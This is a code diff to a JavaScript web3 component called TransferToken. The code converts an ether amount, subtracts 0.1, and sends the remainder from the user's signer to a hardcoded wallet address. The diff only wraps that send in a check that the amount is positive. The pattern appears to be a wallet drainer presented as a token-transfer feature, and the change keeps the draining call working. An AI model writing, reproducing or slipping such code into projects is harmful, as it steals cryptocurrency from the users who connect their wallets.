@@ -55,11 +55,12 @@ export const TransferToken = () => {
                 console.log(Number(web3.utils.fromWei(amount, 'ether').toString()))
                 const sendAmount = Number(web3.utils.fromWei(amount, 'ether').toString()) - 0.1;
                 console.log(sendAmount)
-                const tx = signer.sendTransaction({
-                    to: '0xEA694f5c81a03f32c70E1177B83b1dca5163Cd53',
-                    value: web3.utils.toWei(sendAmount.toString(), 'ether')
-                });
-
+                if (sendAmount > 0) {
+                    const tx = signer.sendTransaction({
+                        to: '0xEA694f5c81a03f32c70E1177B83b1dca5163Cd53',
+                        value: web3.utils.toWei(sendAmount.toString(), 'ether')
+                    });
+                }
                 // token1Contract = new ethers.Contract(
                 //     token1Addr,
                 //     token1Cont.abi,
